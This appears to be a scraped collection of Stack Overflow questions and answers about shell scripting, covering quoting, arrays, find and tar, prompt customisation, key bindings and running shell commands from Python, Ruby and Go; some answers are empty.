    "How to fetch proxy password from osx keychain in python?": "It's super convenient to use the keyring library in Python. Installation was trivial for me:\n$ sudo easy_install keyring\nThen, use the simple API like described here: https://alexwlchan.net/2016/11/you-should-use-keyring/\n$ python\n>>> import keyring\n>>> import getpass\n>>> keyring.set_password('twitter', 'xkcd', getpass.getpass())\nPassword: \n>>> keyring.get_password('twitter', 'xkcd')\nu'correct horse battery staple'\nSee https://xkcd.com/936/ for the story behind this password. :-)\nI'm not sure whether this integrates completely with the proxy passwords you're referring to, because I'm just using it for storing a password for a simple script.",
    "Linux - Bash Redirect a String to a file": "You need to wrap your variables in double quotes:\necho \"$newexpr\" > \"$path/$file\"\nThe quotes around $path/$file aren't actually necessary in this case but they do no harm.\nMore generally, you should also use $( ) rather than backticks:\nnewexpr=$(awk '/^Build Number/{$4=$4+1;}1' \"$path/$file\")\nIf you want to achieve the effect of changing the file \"in-place\", you don't need to use a variable. You can use a temporary file like this:\nawk '/^Build Number/{$4=$4+1;}1' \"$path/$file\" > /tmp/file && mv /tmp/file \"$path/$file\"\nThe importance of using quotes\nThe double quotes preserve the original format of the data. See this simple example, which uses set -x to activate debug mode. The commands that are being executed by the shell are shown on the lines beginning with +. Actually I see that you're already using #!/bin/bash -x. set -x does the same thing as that.:\n$ s=\"1\n> 2\"\n$ set -x\n$ echo $s\n+ echo 1 2\n1 2\n$ echo \"$s\"\n+ echo '1\n2'\n1\n2\nThe original string contains a newline but when you echo it without quotes, it is interpreted as two arguments to echo, instead of one argument that contains a newline. This is called field splitting. You can learn more about the importance of using double quotes by reading this this wiki article.",
    "bash shell script to delete directory only if there are no files": "You don't need to check; rmdir will only delete empty directories.\n$ mkdir foo\n$ touch foo/bar\n$ rmdir foo\nrmdir: foo: Directory not empty\n$ rm foo/bar\n$ rmdir foo\n$ ls foo\nls: foo: No such file or directory\nIn a more practical setting, you can use the rmdir command with an if statement to ask the user if they want to remove everything.\nif ! rmdir foo 2> /dev/null; then\n    echo \"foo contains the following files:\"\n    ls foo/\n    read -p \"Delete them all? [y/n]\" answer\n    if [[ $answer = [yY] ]]; then\n        rm -rf foo\n    fi\nfi",
    "linux bash script get user input and store in a array": "read it like this:\nread -a arr\nTest:\nread -a arr <<< \"1 4 6 9 11 17 22\"\nprint # of elements in array:\necho ${#arr[@]}\nOR loop through the above array\nfor i in ${arr[@]}\ndo\n   echo $i # or do whatever with individual element of the array\ndone",
    "Show job count in bash prompt only if nonzero": "You can e.g. do something like this:\nPS1='\\u@\\h:\\w $([ \\j -gt 0 ] && echo [\\j])\\$ '",
    "Executing shell command in background from ruby with proper argument escaping": "In Ruby 1.9, try Process.spawn:\n# Spawn a new process and run the rake command\npid = Process.spawn({\"subject\" => params[:subject]},\n                    \"rake\", \"send_mails\",\n                    :out => 'dev/null', :err => 'dev/null')\n\n# Detach the spawned process\nProcess.detach pid",
    "Delete contents of a directory recursively on Windows": "Assuming that you are executing the command from the top-level directory:\nfor /d %X in (*.*) do rd /s /q %X\nIf you are executing this from a script, you must use double percent signs:\nfor /d %%X in (*.*) do rd /s /q %%X\nIf you need to delete the files in the top-level directory as well, add this to the script:\ndel /q /f *",
    "How to get the newly-installed version within a Debian postinst script?": "This is the best method I have found to resolve this issue is to use a place-holder variable in your .postinst (or other control files):\ncase \"$1\" in\n    configure)\n        new_version=\"__NEW_VERSION__\"\n        # Do something interesting interesting with $new_version...\n        ;;\n    abort-upgrade|abort-remove|abort-deconfigure)\n        # Do nothing\n        ;;\n    *)\n        echo \"Unrecognized postinst argument '$1'\"\n        ;;\nesac\nThen in debian/rules, replace the placeholder variable with the proper version number at build time:\n# Must not depend on anything. This is to be called by\n# binary-arch/binary-indep in another 'make' thread.\nbinary-common:\n    dh_testdir\n    dh_testroot\n    dh_lintian\n    < ... snip ... >\n\n    # Replace __NEW_VERSION__ with the actual new version in any control files\n    for pkg in $$(dh_listpackages -i); do \\\n        sed -i -e 's/__NEW_VERSION__/$(shell $(SHELL) debian/gen_deb_version)/' debian/$$pkg/DEBIAN/*; \\\n    done\n\n    # Note dh_builddeb *must* come after the above code\n    dh_builddeb\nThe resulting .postinst snippet, found in debian/<package-name>/DEBIAN/postinst, will look like:\ncase \"$1\" in\n    configure)\n        new_version=\"1.2.3\"\n        # Do something interesting interesting with $new_version...\n        ;;\n    abort-upgrade|abort-remove|abort-deconfigure)\n        # Do nothing\n        ;;\n    *)\n        echo \"Unrecognized postinst argument '$1'\"\n        ;;\nesac",
    "What is the source of a \"with-contenv\" shebang?": "Indeed, this is related, and very specific, to the s6-overlay architecture. This is a tool for using the s6 process supervisor inside of Docker containers.\nIn some more detail, Docker is otherwise not well-suited to running multiple services and daemons in the same container, and the general architecture of a supervisor is at odds with how Docker wants things. s6-overlay attempts to fix this, so that you can run services inside of a single Docker container.\nAs explained in the documentation, with-contenv is a wrapper which makes sure the argument is run with the environment variables specific to s6-overlay.\nConcretely, it uses s6-envdir to load the environment from /var/run/s6/container_environment before executing its argument (in this case, bash).",
    "SED or AWK replace all with patterns from another file": "Benchmarks for future reference\nTest environment:\nUsing your sample files patterns.txt with 50,000 lines and contents.txt also with 50,000 lines.\nAll lines from patterns.txt are loaded in all solutions but only the first 1000 lines of contents.txt are examined.\nTesting laptop is equipped with a dual core 64bit Intel(R) Celeron(R) CPU N3050 @ 2.16GHz, 4 GB RAM, Debian 9 64bit Testing , gnu sed 4.4 and gnu awk 4.1.4\nIn all cases the output is sent to a new file to avoid the slow overhead for printing data on the screen.\nResults:\n1. RavinderSingh13 1st awk solution\n$ time awk 'FNR==NR{a[$1]=$2;next}   {for(i in a){match($0,i);val=substr($0,RSTART,RLENGTH);if(val){sub(val,a[i])}};print}' patterns.txt  <(head -n 1000 contents.txt) >newcontents.txt\n\nreal    19m54.408s\nuser    19m44.097s\nsys 0m1.981s\n2. EdMorton 1st awk Solution\n$ time awk 'NR==FNR{map[$1]=$2;next}{for (old in map) {gsub(old,map[old])}print}' patterns.txt <(head -n1000 contents.txt) >newcontents.txt\n\nreal    20m3.420s\nuser    19m16.559s\nsys 0m2.325s\n3. Sed (my sed) solution\n$ time sed -f <(printf 's/%s/%s/g\\n' $(<patterns.txt)) <(head -n 1000 contents.txt) >newcontents.txt\n\nreal    1m1.070s\nuser    0m59.562s\nsys 0m1.443s\n4. Cyrus sed solution\n$ time sed -f <(sed -E 's|(.*) (.*)|s/\\1/\\2/|g' patterns.txt) <(head -n1000 contents.txt) >newcontents.txt\n\nreal    1m0.506s\nuser    0m59.871s\nsys 0m1.209s\n5. RavinderSingh13 2nd awk solution\n$ time awk 'FNR==NR{a[$1]=$2;next}{for(i in a){match($0,i);val=substr($0,RSTART,RLENGTH);if(val){sub(val,a[i]);print;next}};}1' patterns.txt  <(head -n 1000 contents.txt) >newcontents.txt\n\nreal    0m25.572s\nuser    0m25.204s\nsys     0m0.040s\nFor a small amount of input data like 1000 lines, awk solution seems good. Lets make make another test with 9000 lines this time to compare performance\n6.RavinderSingh13 2nd awk solution with 9000 lines\n$ time awk 'FNR==NR{a[$1]=$2;next}{for(i in a){match($0,i);val=substr($0,RSTART,RLENGTH);if(val){sub(val,a[i]);print;next}};}1' patterns.txt  <(head -9000 contents.txt) >newcontents.txt\n\nreal    22m25.222s\nuser    22m19.567s\nsys      0m2.091s\n7. Sed Solution with 9000 lines\n$ time sed -f <(printf 's/%s/%s/g\\n' $(<patterns.txt)) <(head -9000 contents.txt) >newcontents.txt\n\nreal    9m7.443s\nuser    9m0.552s\nsys     0m2.650s\n8. Parallel Seds Solution with 9000 lines\n$ cat sedpar.sh\ns=$SECONDS\nsed -f <(printf 's/%s/%s/g\\n' $(<patterns.txt)) <(head -3000 contents.txt) >newcontents1.txt &\nsed -f <(printf 's/%s/%s/g\\n' $(<patterns.txt)) <(tail +3001 contents.txt |head -3000) >newcontents2.txt &\nsed -f <(printf 's/%s/%s/g\\n' $(<patterns.txt)) <(tail +6001 contents.txt |head -3000) >newcontents3.txt &\nwait\ncat newcontents1.txt newcontents2.txt newcontents3.txt >newcontents.txt && rm -f newcontents1.txt newcontents2.txt newcontents3.txt\necho \"seconds elapsed: $(($SECONDS-$s))\"\n\n$ time ./sedpar.sh\nseconds elapsed: 309\n\nreal    5m16.594s\nuser    9m43.331s\nsys     0m4.232s\nSplitting the task to more commands like three parallel seds seems that can speed things up.\nFor those who would like to repeat the benchmarks on their own PC you can download files contents.txt and patterns.txt either by OP's links or by my github:\ncontents.txt\npatterns.txt",
    "Bad : modifier in $ (/)": "As Ignacio Vazquez-Abrams, pointed out you need to set environment variable in tcsh syntax as\nsetenv LD_LIBRARY_PATH ${LD_LIBRARY_PATH}:\"/home/my/lib\"",
    "Git Shell - go command not found": "You have to put the Go executable in your PATH:\n1) cd ~\n2) vi .bashrc\n3) Inside .bashrc, enter the following: PATH=$PATH:/c/Go/bin\nRestart git bash and you should now have the go command",
    "How to import shell functions from one file into another?": "Brief answer: you need to import your functions using . or source instead of bash -c:\n# Load the test function\nsource \"lib/test.sh\"\nLonger answer: when you call script with bash -c, a child process is created. This child process sees all exported variables (including functions) from parent process. But not vice versa. So, your script will never see comex function. Instead you need to include script code directly in current script and you do so by using . or source commands.\nPart 2. After you \"sourced\" lib/test.sh, your main script is able to use comex function. But arch scripts won't see this function because it is not exported to them. Your need to export -f comex:\n#!/bin/bash\n\nfunction comex {\n  which $1 >/dev/null 2>&1\n}\nexport -f comex",
    "how does `shopt -s lastpipe` affect bash script behavior?": "lastpipe (introduced in bash 4.2, by the way) can only be simulated by not using a pipe. You need to explicitly run the last command of the pipe line in the current shell, and redirect its input from either a process substitution\n# foo | bar | baz becomes ...\nbaz < <(foo | bar)\nor a named pipe (which is POSIX-compliant as well)\n# foo | bar | baz becomes ...\nmkfifo baz_input\nfoo | bar > baz_input &\nbaz < baz_input",
    "Enable/Disable NFC with ADB command": "",
    "How to create tar for files older than 7 days using linux shell scripting": "This will work:\n#!/bin/bash\nfiles=()\nwhile IFS=  read -r -d $'\\0'; do\n    files+=(\"$REPLY\")\ndone < <(find /var/log/ -mtime +7 -print0)\ntar cvfz backup.tar.gz \"${files[@]}\"\nNote the use of \"${files[@]}\" as opposed to ${files[*]}. \"${files[@]}\" will expand to provide tar with one argument per file name and will work even if the file names contain spaces, tabs, or newlines. By contrast, after the shell expands ${files[*]}, it will perform word splitting, potentially mangling your file names.\nFor a detailed explanation of the loop used to create the files array, see: How can I store find command result as arrays in Bash\nAll files and directories produced by the command find /var/log/ -mtime +7 will be included in the tar file. To include only files, not directories, see Skynet's answer.\nTo archive logs from the seven most recent days\nOnly one character need change:\n#!/bin/bash\nfiles=()\nwhile IFS=  read -r -d $'\\0'; do\n    files+=(\"$REPLY\")\ndone < <(find /var/log/ -mtime -7 -print0)\ntar cvfz backup.tar.gz \"${files[@]}\"\nThis works because find interprets numeric arguments as follows:\nNumeric arguments can be specified as\n+n for greater than n,\n-n for less than n,\nn for exactly n.\nThus, -mtime +7 means greater than 7 days old while -mtime -7 means less than 7. Note that find will ignore fractional parts. Thus +7 will include 8 days old but not 7.5 days old. See man find for details.",
    "Comparing variables in shell scripts": "After if, you need a shell command, like anywhere else. $X = $Y is parsed as a shell command, meaning $X is interpreted as a command name (provided that the value of the variable is a single word).\nYou can use the [ command (also available as test) or the [[ \u2026 ]] special syntax to compare two variables. Note that you need spaces on the inside of the brackets: the brackets are a separate token in the shell syntax.\nif [ \"$X\" = \"$Y\" ]; then \u2026\nor\nif [[ \"$X\" = \"$Y\" ]]; then \u2026\n[ \u2026 ] works in any shell, [[ \u2026 ]] only in ksh, bash and zsh.\nNote that you need double quotes around the variables\u00b9. If you leave off the quotes, then the variable is split into multiple words and each word is interpreted as a wildcard pattern. This doesn't happen inside [[ \u2026 ]], but the right-hand side of = is interpreted as a wildcard pattern there too. Always put double quotes around variable substitutions (unless you want the value of the variable to be used as a list of filename matching patterns, rather than as a string).\n\u00b9 Except on $X the [[ \u2026 ]] syntax.",
    "How to unzip the file_name.csv.gz files to .csv [closed]": "find . -name '*.csv.gz' -print0 | xargs -0 -n1 gzip -d\nShould sort you, alternatively:\nfind . -name '*.csv.gz' -exec gzip -d {} \\;\nwill also work. These are recursive so they will go into subdirs.",
    "how to find a function from a folder on linux": "Try doing this\nusing\ngrep\n:\ngrep -Hri function_name .\nif you want only the path :\ngrep -ril function_name .\nExplanations\nthe trailing . stands for current directory\n-i : case-insensitive\n-r : recursive\n-H : Print the file name for each match\n-l : Suppress normal output; instead print the name of each input file from which output would normally have been printed.\nSee man grep\nLast but not least\nAn interesting tool is ack, it will avoid searching in .svn, .cvs, .git dirs and such... It is designed to search code.\nExample :\n$ cd /usr/share/perl5\n$ ack -r 'Larry\\s+Wall'\nsite_perl/Inline/C.pm\n370:# bindings to. This code is mostly hacked out of Larry Wall's xsubpp program.\n\ncore_perl/overload/numbers.pm\n5:#    Copyright (C) 2008 by Larry Wall and others\n\ncore_perl/CPAN.pm\n876:#       From: Larry Wall <larry@wall.org>\nor just file path :\n$ ack -rl 'Larry\\s+Wall'\nvendor_perl/LWP.pm\nsite_perl/Inline/C.pm\ncore_perl/overload/numbers.pm\ncore_perl/CPAN.pm\ncore_perl/SelfLoader.pm\ncore_perl/AutoLoader.pm\ncore_perl/AutoSplit.pm\ncore_perl/Test/Harness.pm\ncore_perl/XSLoader.pm\ncore_perl/DB.pm\nNo need the ending . with ack (compared to grep)",
    "Django shell: Command to load test fixture data?": "ilardm's answer points in the right direction, specifically what you want is:\nfrom django.core.management import call_command\ncall_command('loaddata', 'fixture_name.json')\nEdit: But the correct way to include fixtures in test cases is like this:\nclass TestThis(TestCase):\n    fixtures = ['myfixture.json']\n\n    def setUp(self):\n        # Ready to test",
    "Reading a file inside makefile": "You can put an arbitrary piece of shell script in a target. Keeping the file's contents in a Makefile variable does not make any sense to me, unless you also need the data in other targets for other reasons. (If so, you cannot use backticks, anyway.)\ntarget:\n        @while read -r file; do \\\n            test -e \"$$file\" && echo \"$$file\"; \\\n        done <metafile\nFor what it's worth, the while loop is a safer and more idiomatic way to loop over a file's lines in a shell script than the for loop with backticks, even though you see that a lot.\nThe @ prevents Make from echoing the shell script commands; take that out if for some reason you need to see them. In fact, I recommend against using this, especially while you are debugging -- use make -s to have make run silently once you are confident your recipe works correctly.\nA more idiomatic way to do this in a Makefile is to have a target depend on these files, and use Make's own logic:\ntarget: file1 file2 file3\n        @echo $(filter-out $?,$^)\nThis is GNU Make syntax; it might get more complex if you want to be portable to other Make flavors (to the point where maybe the shell script is preferable after all). It will echo everything on one line, but if you need separate lines, that should be a trivial fix.\nI would simply build a small auxiliary Makefile snippet and include the dependencies:\ntarget: target.d\ntarget.d: metafile\n        sed 's/^/target: /' $< >$@\ninclude target.d\nThis builds a small list of dependencies so you don't need to list them in the target: dependencies explicitly; so instead of file1 file2 file3 in the recipe above, the dependencies would live in the generated target.d which would contain\ntarget: file1\ntarget: file2\ntarget: file3\nYou need to filter out the dependency on target.d (or leave it undeclared; I believe GNU Make should cope).",
    "Bash script capturing output to terminal": "If the output is being sent to stderr, you'll need to redirect that to stdout before it can be capture in your var. Try:\nTEST_OUT=$(the_command ARG1 2>&1)",
    "Make java program return value to calling shell script": "I would not recommend using the exit status to carry data, for the reasons you've stated. Catching the exit status depends on what shell you're using, but in Bash, the special $? variable contains the exit status of the last process executed.\nWriting data to stdout is far more idiomatic. In Bash, you capture it as follows:\noutput=$(java Java_Program)\nor:\noutput=`java Java_Program`\n(You will often hear arguments that the first syntax is to be preferred.)\nYou can then feed this to stdin of your next process with:\necho $output > java Java_Program_2\nMore simply, you can simply pipe your processes together:\njava Java_Program | java Java_Program_2",
    "How to access mysql database using shell script?": "This link seems to have the information you want.\nhttp://www.cyberciti.biz/faq/using-mysql-in-shell-scripts/\nmysql -u user -p dbnane",
    "how to integrate ZSH and (i)python?": "I asked this question on the zsh list and this answer worked for me. YMMV.\nIn genutils.py after the line\nif not debug:\nRemove the line:\nstat = os.system(cmd)\nReplace it with:\nstat = subprocess.call(cmd,shell=True,executable='/bin/zsh')\nyou see, the problem is that that \"!\" call uses os.system to run it, which defaults to manky old /bin/sh .\nLike I said, it worked for me, although I'm not sure what got borked behind the scenes.",
    "Streaming exec.Command StdoutPipe": "You need to start the command:\ncmd := exec.Command(\"sh\", \"-c\", `for number in {0..10}; do echo \"$number \"; done;`)\npipe, _ := cmd.StdoutPipe()\nif err := cmd.Start(); err != nil {\n   // handle error\n}\nreader := bufio.NewReader(pipe)\nline, err := reader.ReadString('\\n')\nfor err == nil {\n    fmt.Println(line)\n    line, err = reader.ReadString('\\n')\n}\nCall Wait after reaching EOF.\nThe Output and CombinedOutput methods worked for you because these methods call Start internally.",
    "Where will be nohup file created/stored": "Could you check home directory.\nalso you can redirect as below;\nnohup /usr/hp/ism/jboss-3.2.8.SP1/bin/run.sh &> /tmp/nohup.out\nman nohup ;\nIf standard input is a terminal, redirect it from /dev/null. If standard output is a terminal, append output to 'nohup.out' if possible, '$HOME/nohup.out' otherwise. If standard error is a terminal, redirect it to standard output. To save output to FILE, use 'nohup COMMAND > FILE'.",
    "Scrapy shell against a local file": "Update: for Scrapy >=1.1, this is a built-in feature, you can do:\nscrapy shell file:///path/to/file.html\nOld answer:\nAs per discussion in Running scrapy shell against a local file, the relevant change was introduced by this commit. There was a Pull Request for this issue created to make Scrapy shell open local files again and, it is planned to be a part of Scrapy 1.1.",
    "How to calculate the total size of certain files only, recursive, in linux": "For individual file size:\nfind . -name \"*.mp4\" -print0 | du -sh --files0-from=- \nFor total disk space in GB:\nfind . -name \"*.mp4\" -print0 | du -sb --files0-from=-  | awk '{ total += $1} END { print total/1024/1024/1024 }'",
    "Android: Adb rejected connection to client": "",
    "How can I reset the startup directory to my HOME in Fish?": "I had found that the config.fish file that runs at startup had been changing my default working directory.\nA misguided attempt at setting my PATH left a list of directories in my config.fish, the first of which was /usr/lib/lightdm/lightdm. Fish automatically assumes directories without a command should be cd`d into, so my shell was cd`ing into that directory at startup.\nI removed the stray lines and all is well.\nTo change your fish startup directory: add cd /path/to/new/startup/directory to your ~/.config/fish/config.fish file, or create it if it does not exist.",
    "What is %~ (percent tilde) in ZSH?": "See EXPANSION OF PROMPT SEQUENCES section of man zshmisc:\n   %d\n   /      Current  working  directory.   If an integer follows the `%', it\n          specifies a number of trailing components of the current working\n          directory  to show; zero means the whole path.  A negative inte\u2010\n          ger specifies leading components, i.e. %-1d specifies the  first\n          component.\n\n   %~     As  %d  and %/, but if the current working directory has a named\n          directory as its prefix, that part is replaced by a `~' followed\n          by  the  name  of  the directory.  If it starts with $HOME, that\n          part is replaced by a `~'.",
    "How can I tell if a file is on a remote filesystem with Perl?": "stat -f -c %T <filename> should do what you want. You might also want -l",
    "What is the bashrc equivalent in alpine linux ash?": "For interactive shells\nAs man ash tells you in the Invocation section, the environment variable ENV can be used to specify a file to source during shell startup.\nIn your Dockerfile:\nENV ENV=/home/youruser/.rc\n...and then your shell will execute the contents of /home/youruser/.rc during startup.\nIn bash, BASH_ENV (used when not in POSIX mode) runs even for noninteractive shells; when bash is in POSIX mode, it runs ENV for interactive shells only (which is the only circumstance in which the POSIX specification requires ENV to be honored).",
    "Get real architecture of M1 Mac regardless of Rosetta": "Thanks to @Ouroborus, this note describes how to figure out if your app is translated.\nIf it's translated:\n$ sysctl sysctl.proc_translated\nsysctl.proc_translated: 1\nIf not:\n$ sysctl sysctl.proc_translated\nsysctl.proc_translated: 0\nOn non-ARM Macs:\n$ sysctl sysctl.proc_translated\nsysctl: unknown oid 'sysctl.proc_translated'",
    "How to remap escape insert mode to 'jk' in fish shell?": "I'm assuming you've already enabled vi mode by executing fish_vi_key_bindings. Otherwise the question doesn't make sense :-)\nCreate a file named ~/.config/fish/functions/fish_user_key_bindings.fish that contains this:\nfunction fish_user_key_bindings\n    bind -M insert jk \"if commandline -P; commandline -f cancel; else; set fish_bind_mode default; commandline -f backward-char force-repaint; end\"\nend\nYou can run the bind interactively but it won't be persistent across new fish sessions unless you create that autoloaded function. Also, if you switch between vi and emacs binding you'll want to guard that bind so it's only done for vi mode:\nif test \"$__fish_active_key_bindings\" = \"fish_vi_key_bindings\"\n    bind ....\nend",
    "Python subprocess argument with equal sign and space": "Here's what you need to know:\nSpaces are used for separating arguments on the shell command line. However, if you are not using shell, you don't need to escape spaces. Spaces can be escaped at least two ways ( that I know of ): With quotes ( either single or double ) and the backslash .\nWhen you pass an array to subprocess.check_output() you are already dividing the command into parameters for the subprocess. Thus, you don't need the quotes around \"something with spaces\". That is, you don't need to escape the spaces. Rather, the quotes are being taken quite literally as quotes as you have shown with your result snippet:\ncommand \"--parameter=\\\"something with spaces\\\"\"\nBy now I hope you have guessed what the right answer is. Spoiler ahead:\nsubprocess.check_output(['command', '--parameter=something with spaces'])",
    "Pipe command with sudo": "So you want to redirect output as root. It doesn't matter that you executed the command with sudo, because redirection is not part of the execution, so it's not performed by the executing user of the command, but by your current user.\nThe common trick is to use tee:\nfor i in \"${NAME}\"*\ndo\n    sudo md5sum \"$i\" | sed -e \"s/$i/${NAME}/\" | sudo tee \"${NAME}.md5${i/#${NAME}/}\"\ndone\nNote: tee outputs in two directions: the specified file and stdout. If you want to suppress the output on stdout, redirect it to /dev/null.",
    "Check if S3 file has been modified": "",
    "Add element into Array": "The problem is with printing ie echo $fa. This is equivalent to echo ${fa[0]} which means the first element of the array, so you gotelement1\necho \"${fa[@]}\"\nshould give you the entire array.\nReference\n[ This ] should give you a nice description about bash arrays.",
    "Makefile recipe with a here-document redirection": "Using the line .ONESHELL: somewhere in your Makefile will send all recipe lines to a single shell invocation, you should find your original Makefile works as expected.",
    "Pass in variable from shell script to applescript": "Shell variables don't expand inside single quotes. When you to want pass a shell variable to osascript you need to use double \"\" quotes. The problem is, than you must escape double quotes needed inside the osascript, like:\nthe script\nsay \"Hello\" using \"Alex\"\nyou need escape quotes\ntext=\"Hello\"\nosascript -e \"say \\\"$text\\\" using \\\"Alex\\\"\"\nThis not very readable, therefore it much better to use the bash's heredoc feature, like\ntext=\"Hello world\"\nosascript <<EOF\nsay \"$text\" using \"Alex\"\nEOF\nAnd you can write multiline script inside for a free, it is much better than using multiple -e args...",
    "C function to escape string for shell command argument?": "Replacing all instances of ' with '\\'' then enclosing the whole string in single quotes (') is one safe way. This works even with embedded newlines. Another method would be to insert \\ before each character, except that then you have to do some special treatment for newlines since \\ followed by a newline is ignored by the shell, not treated as a literal newline. You'd have to surround newlines with ' (single quotes).",
    "How to map Delete and End keys on tcsh shell?": "Those keys already worked on my Debian system. I found these commands in the /etc/csh.cshrc file:\nif ($?tcsh && $?prompt) then\n        bindkey \"\\e[1~\" beginning-of-line # Home\n        bindkey \"\\e[7~\" beginning-of-line # Home rxvt\n        bindkey \"\\e[2~\" overwrite-mode    # Ins\n        bindkey \"\\e[3~\" delete-char       # Delete\n        bindkey \"\\e[4~\" end-of-line       # End\n        bindkey \"\\e[8~\" end-of-line       # End rxvt\nendif",
    "How to execute Shell Script from Flask App [duplicate]": "To show command output inside Python, there are two popular methods:\ncheck_output(): It runs command with arguments and return its output. (official documentation)\nsubprocess.communicate(): Interact with process: Send data to stdin. Read data from stdout and stderr, until end-of-file is reached. (official documentation)\nI could view the shell file output using both methods using Python 3.5 in an Ubuntu machine.\napp.py:\nimport subprocess\nfrom subprocess import Popen, PIPE\nfrom subprocess import check_output\nfrom flask import Flask\n\ndef get_shell_script_output_using_communicate():\n    session = Popen(['./some.sh'], stdout=PIPE, stderr=PIPE)\n    stdout, stderr = session.communicate()\n    if stderr:\n        raise Exception(\"Error \"+str(stderr))\n    return stdout.decode('utf-8')\n\ndef get_shell_script_output_using_check_output():\n    stdout = check_output(['./some.sh']).decode('utf-8')\n    return stdout\n\napp = Flask(__name__)\n\n@app.route('/',methods=['GET',])\ndef home():\n    return '<pre>'+get_shell_script_output_using_check_output()+'</pre>'\n\napp.run(debug=True)\nsome.sh:\n#!/bin/bash\necho \"hi from shell script\"\necho \"hello from shell script\"\nOutput screenshot:",
    "Bash: duplicate + rename folder": "Tutorial copy files, folder link: link\nManual cp command : Link\ncp -frp /path/to/folder/my_folder_old -T /path/to/folder/my_folder_new\n\n   -f, --force\n          if an existing destination file cannot be opened, remove it\n          and try again (this option is ignored when the -n option is\n          also used)\n   -p     same as --preserve=mode,ownership,timestamps\n   -R, -r, --recursive\n          copy directories recursively\n   -T, --no-target-directory\n          treat DEST as a normal file\nThough if my_folder_new already exists, my_folder_old is created inside the first and not substituted. Why is this happening?\nThe reason why is this happening because, my_folder_new already created. Doing same cp command it will see as new path, /path/to/folder/my_folder_new/",
    "Does crontab take command line arguments? [closed]": "Yes, crotab lines can get arguments as the man page says so.\nMost likely something goes wrong while calling that command that resides in the change of environment from your console to the not-a-console cron environment.\nUsually its best to add logging functions to your cron line to get the output of whats happening.\n*/5 * * * * sh /home/adhikarisubir/test/basic_unix/trace_bkp.sh 2 /home/adhikarisubir/test/basic_unix /home/adhikarisubir/test_bkp >> /home/adhikarisubir/test/basic_unix/cron.log 2>&1\nThen read that log and you will see how it goes wrong.",
    "How to pass shell variables as Command Line Argument to a shell script": "Bash scripts take arguments after the call of the script not before so you need to call the script like this:\n./StatCollection_DBServer.sh DD 50\ninside the script, you can access the variables as $1 and $2 so the script could look like this:\n#!/bin/bash\nLOG_DIRECTORY=\"${1}_${2}users\"\nmkdir -m 777 \"${LOG_DIRECTORY}\"\nI hope this helps...\nEdit: Just a small explanation, what happened in your approach:\nprodName='DD' users=50 ./StatCollection_DBServer.sh\nIn this case, you set the environment variables prodName and users before calling the script. That is why you were able to use these variables inside your code.",
    "how to terminate a process which is run with sudo? Ctrl+C do it, but not kill": "Try the -Z option to tcpdump. It instructs tcpdump to drop root privileges and run as the user specified in the argument.\nsudo tcpdump -Z $USER -ieth1 -w ~/dump.bin\nNow try killing that process.",
    "How run shell script from R or/and from Matlab?": "",
    "Correct ARCHFLAGS value on Apple Silicon?": "There's a long discussion over here on this topic. Long story short, they're agreeing on trusting uname -m to provide the correct architecture name.\nThis returns arm64, and given lack of evidence to the contrary, is probably the correct value.",
    "Batch file stops executing after mvn command": "When invoking Maven from a batch file to create a new project via archetype you should be aware of the interactive mode of the execution, that is, Maven will prompt for certain values or ask for confirmation.\nIt seems in your case this is not the desired behavior. You should hence pass via command line some options of the generate goal and the specific archetype and then run either in batch mode via the -B standard Maven option or via -DinteractiveMode=true.\nFrom official documentation you should pass\nThe archetypeGroupId, archetypeArtifactId and archetypeVersion defines the archetype to use for project generation.\nThe groupId, artifactId, version and package are the main properties to be set. Each archetype require these properties. Some archetypes define other properties; refer to the appropriate archetype's documentation if needed\nHence in your case:\ncall mvn archetype:generate -DarchetypeCatalog=file://%homepath%/.m2/repository -B \\\n-DarchetypeGroupId=com.sample -DarchetypeArtifactId=artifact -DarchetypeVersion=1.0 \\ \n-DgroupId=your.groupid -DartifactId=your.artifactId -Dversion=0.0.1-SNAPSHOT \\\n-Dsomething-else=value\nNote: \\ added for readability, you don't actually need it",
    "How to prevent Fish shell from closing when typing Ctrl-D (EOF)": "This is the default key binding for control-D:\nbind \\cd delete-or-exit\nyou can find this by just running bind.\n(delete-or-exit is just a function, which you can read with functions delete-or-exit.)\nSo it's exiting because that's what the default behavior is. You can make control-D do something else. For example, maybe it should delete the character under the cursor:\nbind \\cd delete-char\nIf you want to make this permanent, add it to your fish_user_key_bindings function:\nRun funced fish_user_key_bindings which starts editing\nPut bind \\cd delete-char within the function\nHit return to create the function\nRun funcsave fish_user_key_bindings to save it",
    "Exclude sub directories from find: why is -not -path not working?": "You nested find command should be:\nfind ~/App/Classes/ -type f -name \"*.m\"  -not -path \"./Lib/excludethisdir/*\"\ni.e. add ./ before your excluded path.\nOr even better:\nfind ~/App/Classes/ -path \"./Lib/excludethisdir/*\" -prune -o -type f -name \"*.m\" -print",
    "Mount an SD card manually from adb shell in android": "",
    "Passing arguments to a function within an if statement in bash": "You can either return a result from your function or use $() to capture its output:\nif [ $(foo $arg) -eq 0 ] ; then",
    "Unbound variable not causing exit from subshell when set -eu": "The better solution to ensure variable sanitisation\n#!/usr/bin/env bash\n\nset -eu\n\nif [[ ${1-} ]]; then\n  DNE=$1\nelse\n  echo \"ERROR: Please enter a valid filename\" 1>&2\n  exit 1\nfi\nBy putting a hyphen in to the variable name inside curly braces like this allows bash to sanely handle the variable being undefined. I also highly recommend looking at the Google shell style guide, it's a great reference https://google.github.io/styleguide/shell.xml\n[[ -z ${variable-} ]] \\\n  && echo \"ERROR: Unset variable \\${variable}\" \\\n  && exit 1 \\\n  || echo \"INFO: Using variable (${variable})\"",
    "How to compare hexadecimal numbers with hexadecimal numbers in shell?": "At least bash supports hexadecimal integers directly, provided that they are prefixed with 0x:\n$ [[ 0xdead -lt 0xcafe ]] && echo yes || echo no\nno\n$ [[ 0xdead -gt 0xcafe ]] && echo yes || echo no\nyes\nYou just use the comparison operators normally...",
    "starting script in screen": "You can use:\nscreen -dm bash -c 'python your_script.py'\nIf you need several commands, use ;:\nscreen -dm bash -c 'source ~/.bash_profile; python your_script.py'\nDocumentation:\nhttps://www.gnu.org/software/screen/manual/screen.html:\n-d -m: Start screen in detached mode. This creates a new session but doesn't attach to it. This is useful for system startup scripts.\nhttp://linux.about.com/library/cmd/blcmdl1_sh.htm :\n-c string: If the -c option is present, then commands are read from string. If there are arguments after the string, they are assigned to the positional parameters, starting with $0.",
